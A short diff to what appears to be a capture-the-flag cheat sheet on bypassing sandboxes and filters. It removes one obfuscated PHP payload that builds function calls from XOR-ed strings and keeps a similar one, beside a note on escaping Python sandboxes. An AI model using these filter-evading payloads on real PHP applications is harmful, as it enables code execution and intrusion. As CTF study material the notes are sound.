@@ -58,5 +58,5 @@ Escape while builtins and open is blacklisted - `globals().__getitem__(bytes.fro
 Hashes Ref : https://blog.csdn.net/u013512548/article/details/108213295
 
 PHP calc :
-`("538869"^"~4~2-~"^"8~5~~*")(("378#"^"~(2,"^".~~%"))`
+
 `('000000'^'8288~!'^'{{{|+|')('000000000000'^'~,81~!,,0838'^'-}|!(}}{.|{|')`
